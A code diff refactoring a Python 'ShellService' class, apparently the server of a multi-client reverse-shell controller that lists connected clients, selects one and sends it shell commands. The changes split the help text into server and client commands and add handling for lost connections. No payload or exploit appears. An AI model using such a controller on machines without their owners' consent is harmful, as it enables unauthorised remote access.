@@ -26,14 +26,17 @@ class ShellService:
         self.sockets_list = []
         self.address_list = []
 
-        # List of commands
-        self.COMMANDS = {
+        # Commands recognized by server prompt
+        self.server_commands = {
             '\n---Prompt Commands---': 'Commands recognized by the server prompt',
             'list': 'List all connected clients\n',
             'select': 'Select the client you want to manage\n'
                       + '\t[argument: Integer value corresponding to connection]',
-            'exit()': 'Terminates the running server and removes all established connections\n\n',
+            'exit()': 'Terminates the running server and removes all established connections\n\n'
+        }
 
+        # Commands recognized by client prompt
+        self.client_commands = {
             '---Client Commands---': 'Special commands recognized by the client prompt',
             'remove': 'Removes the current client connection from the server\n',
             'quit': 'Returns back to the main prompt retaining\n'
@@ -63,7 +66,6 @@ class ShellService:
             response = sock.recv(response_length).decode(self.ENCODING)
 
             return response
-
         except:
             return None
 
@@ -139,17 +141,25 @@ class ShellService:
 
                 # User wants to retain the client connection and
                 # return to the main shell prompt
-                if cmd == 'quit':
+                elif cmd == 'quit':
                     self._send_command(conn, cmd)
                     break
+
+                elif cmd == 'help':
+                    self.display_help(self.client_commands)
 
                 if cmd:
                     self._send_command(conn, cmd)
                     client_response = self._receive_response(conn)
-                    print(client_response, end='')
+
+                    if client_response:
+                        print(client_response, end='')
+                    else:
+                        print("[-] Connection lost\n")
+                        break
 
             except Exception:
-                print("[-] Connection lost")
+                print("[-] Connection lost\n")
                 break
 
     def select_connection(self, message):
@@ -196,18 +206,13 @@ class ShellService:
                     self.send_target_commands(conn)
 
             elif cmd == 'help':
-                self.display_help()
+                self.display_help(self.server_commands)
 
             elif cmd == '':
                 pass
             else:
                 print("[-] Command not recognized\n")
         return
-
-    def display_help(self):
-        """Displays a list of available commands"""
-        for cmd, hlp in self.COMMANDS.items():
-            print("{0} : {1}".format(cmd, hlp))
 
     def job_handler(self):
         """
@@ -236,6 +241,12 @@ class ShellService:
             thread = threading.Thread(target=self.job_handler)
             thread.daemon = True
             thread.start()
+
+    @staticmethod
+    def display_help(commands):
+        """Displays a list of available commands"""
+        for cmd, hlp in commands.items():
+            print("{0} : {1}".format(cmd, hlp))
 
     @staticmethod
     def create_jobs():
